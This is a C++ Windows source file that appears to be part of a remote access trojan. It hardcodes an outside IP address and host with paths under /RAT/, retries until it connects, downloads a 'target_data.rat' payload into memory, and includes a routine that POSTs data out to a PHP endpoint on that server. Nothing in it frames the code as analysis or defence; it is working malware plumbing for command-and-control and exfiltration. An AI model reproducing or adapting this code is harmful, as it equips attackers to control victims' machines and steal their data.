//cl /EHsc .\download_to_memory.cpp /link ws2_32.lib user32.lib kernel32.lib /OUT:download_to_memory.exe
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <mutex>
#include <sstream>
#include <vector>
#include <algorithm>
#include <psapi.h>

using namespace std;
#pragma comment(lib, "ws2_32.lib")

SOCKET sock;
std::mutex socketMutex;

void safe_closesocket(SOCKET &clientSocket);
bool socket_setup(SOCKET &clientSocket);
void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename);

int main()
{

//    vector<unsigned char> data = receive_data(sock, "target_data.rat");
//     if (!data.empty())
//     {
//         string receivedText(data.begin(), data.end());
//         cout << "Received Data (Text):";
//         cout << receivedText << endl;
//     }
//     else
//     {
//         cerr << "No data received or an error occurred." << endl;
//     }

    vector<unsigned char> data = receive_data(sock, "target_data.rat");
    if (!data.empty())
    {
        cout << "Received Data (Raw Hex): ";
        for (unsigned char byte : data)
        {
            cout << hex << (int)byte << " "; // Print each byte as hex
        }
        cout << endl;
    }
    else
    {
        cerr << "No data received or an error occurred." << endl;
    }    
    return 0;
}

bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}

void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
{
    {
        lock_guard<mutex> lock1(socketMutex); 
        
        socket_setup(clientSocket);

        string whole_data = filename+data;
        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
        httpRequest += "Host: arth.imbeddex.com\r\n";
        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
        httpRequest += "Content-Type: application/octet-stream\r\n";
        httpRequest += "Connection: close\r\n\r\n";
        httpRequest += whole_data;                                                                // Append the actual data


        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        }
    
        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                receivedData += buffer; // Append to the received data
            } else if (bytesReceived == 0) {
                cerr << "Connection closed by server." << endl;
                break; // Exit the loop on clean close
            } else {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) {
                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                }
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

        //cout << "\n\nReceived: " << receivedData << endl;

        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        safe_closesocket(clientSocket);
    }
}

vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
{
    lock_guard<mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[4096]; // Increased buffer size
    vector<unsigned char> receivedData;
    int bytesReceived;

    do
    {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

        if (bytesReceived > 0)
        {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        }
        else if (bytesReceived == 0)
        {
            cerr << "Connection closed by server." << endl;
            break; // Exit the loop on clean close
        }
        else
        {
            int error = WSAGetLastError();
            if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
            break; // Exit loop on error
        }
    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << endl;
    }
    else
    {
        cerr << "Header separator not found." << endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        cerr << "Body extraction failed: headerEnd exceeds receivedData size." << endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}